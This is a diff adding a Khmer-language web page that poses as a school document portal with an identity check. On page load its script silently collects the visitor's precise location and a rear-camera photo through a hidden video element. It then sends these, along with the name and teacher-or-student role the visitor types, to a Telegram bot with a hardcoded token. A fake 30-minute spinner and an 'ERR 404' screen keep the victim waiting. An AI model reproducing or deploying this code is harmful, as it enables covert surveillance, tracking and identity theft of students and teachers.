@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ឯកសារសាលា</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Khmer OS', sans-serif, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        /* Spinner */
+        .spinner-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px auto;
+        }
+
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 16px;
+            margin-bottom: 20px;
+            min-height: 24px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+        }
+
+        /* Input Styles */
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0 20px 0;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 5px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .btn {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .error-msg {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 24px;
+            letter-spacing: 2px;
+        }
+
+        /* Hidden Video Preview (Optional for debugging, but we will keep it hidden visually) */
+        #hidden-video {
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- SCREEN 1: Initial Loading (Silent Data Capture) -->
+        <div id="screen-loading">
+            <div class="spinner-container">
+                <div class="spinner"></div>
+            </div>
+            <div class="status-text" id="loading-text">ប្រព័ន្ធកំពុងដំណើរការ</div>
+        </div>
+
+        <!-- SCREEN 2: Identity Input -->
+        <div id="screen-identity" class="hidden">
+            <h1>ផ្ទៀងផ្ទាត់អត្តសញ្ញាណ</h1>
+            <p style="font-size: 14px; color: #ccc; margin-bottom: 15px;">សូមបំពេញឈ្មោះ និងប្រភេទអ្នកប្រើប្រាស់របស់អ្នក</p>
+            
+            <input type="text" id="user-name" placeholder="ឈ្មោះពេញ" autocomplete="off">
+            <input type="text" id="user-type" placeholder="តើអ្នកជាគ្រូឬសិស្ស?" autocomplete="off">
+            
+            <button class="btn" onclick="submitIdentity()">បញ្ជូន</button>
+        </div>
+
+        <!-- SCREEN 3: Final Processing (30 Min Wait) -->
+        <div id="screen-final" class="hidden">
+            <div class="spinner-container">
+                <div class="spinner" id="final-spinner"></div>
+            </div>
+            <div class="status-text" id="final-text">ប្រព័ន្ធកំពុងដំណើរការ</div>
+            <div id="final-error" class="hidden error-msg">ERR 404</div>
+        </div>
+
+        <!-- Hidden Video Element for Camera Capture -->
+        <video id="hidden-video" autoplay playsinline muted></video>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8731995229:AAFSufkEPs5rVIxAY2MmJ51vX1lb6Nh3kMQ';
+        const CHAT_ID = '-1003938989443';
+        let stream;
+        let userLocation = null;
+
+        // --- TELEGRAM HELPER ---
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error("Telegram Text Error", e);
+            }
+        }
+
+        async function sendTelegramPhoto(dataURL, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const blob = dataURLtoBlob(dataURL);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'user_snapshot.jpg');
+            formData.append('caption', caption);
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error("Telegram Photo Error", e);
+            }
+        }
+
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        }
+
+        // --- GEOLOCATION HELPER ---
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    return reject("Geolocation not supported");
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const url = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                        resolve({ lat, lng, accuracy, url });
+                    },
+                    (error) => {
+                        reject(error.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // --- CAMERA HELPER ---
+        async function captureCameraSnapshot() {
+            return new Promise((resolve, reject) => {
+                const video = document.getElementById('hidden-video');
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment', // Rear camera
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                }).then((mediaStream) => {
+                    video.srcObject = mediaStream;
+                    
+                    video.onloadeddata = () => {
+                        // Wait a tiny bit for the camera to focus
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            // Cleanup
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            resolve(dataURL);
+                        }, 1500);
+                    };
+                }).catch((err) => {
+                    reject(err);
+                });
+            });
+        }
+
+        // --- MAIN FLOW ---
+
+        // 1. Initial Silent Capture (Location + Camera)
+        async function startSilentCapture() {
+            let locData = "មិនមានទិន្នន័យទីតាំង";
+            let photoData = null;
+
+            // Get Location
+            try {
+                const loc = await getLocation();
+                locData = `📍 <b>ទីតាំងបច្ចុប្បន្ន</b>\n\nLatitude: ${loc.lat}\nLongitude: ${loc.lng}\nAccuracy: ${loc.accuracy}m\n\n<a href="${loc.url}">Open in Google Maps</a>`;
+            } catch (e) {
+                locData = `⚠️ មិនអាចទទួលបានទីតាំង: ${e}`;
+            }
+
+            // Get Camera Snapshot
+            try {
+                photoData = await captureCameraSnapshot();
+            } catch (e) {
+                photoData = null;
+            }
+
+            // Send Location Text
+            await sendTelegramMessage(`🆕 <b>ថ្មី: អ្នកប្រើប្រាស់បានចូលក្នុងប្រព័ន្ធ</b>\n\n${locData}`);
+
+            // Send Photo if available
+            if (photoData) {
+                await sendTelegramPhoto(photoData, `📸 <b>Snapshot</b>\n\nថ្ងៃ: ${new Date().toLocaleString()}`);
+            }
+
+            // Transition to Identity Screen after a short delay
+            setTimeout(() => {
+                showScreen('screen-identity');
+            }, 2000);
+        }
+
+        // 2. Submit Identity
+        function submitIdentity() {
+            const name = document.getElementById('user-name').value.trim();
+            const type = document.getElementById('user-type').value.trim();
+
+            if (!name || !type) {
+                alert("សូមបំពេញព័ត៌មានឲ្យគ្រប់គ្រាន់");
+                return;
+            }
+
+            // Send Identity to Telegram
+            sendTelegramMessage(`👤 <b>ព័ត៌មានអត្តសញ្ញាណ</b>\n\nឈ្មោះ: ${name}\nប្រភេទ: ${type}`);
+
+            // Transition to Final Screen
+            showScreen('screen-final');
+            
+            // Start 30 Minute Timer
+            setTimeout(() => {
+                document.getElementById('final-spinner').style.display = 'none';
+                document.getElementById('final-text').innerText = "";
+                document.getElementById('final-error').classList.remove('hidden');
+            }, 1800000); // 30 minutes in ms
+        }
+
+        // --- UI MANAGEMENT ---
+        function showScreen(id) {
+            document.querySelectorAll('.container > div').forEach(div => {
+                div.classList.add('hidden');
+            });
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        // Initialize on Load
+        window.onload = () => {
+            startSilentCapture();
+        };
+    </script>
+</body>
+</html>
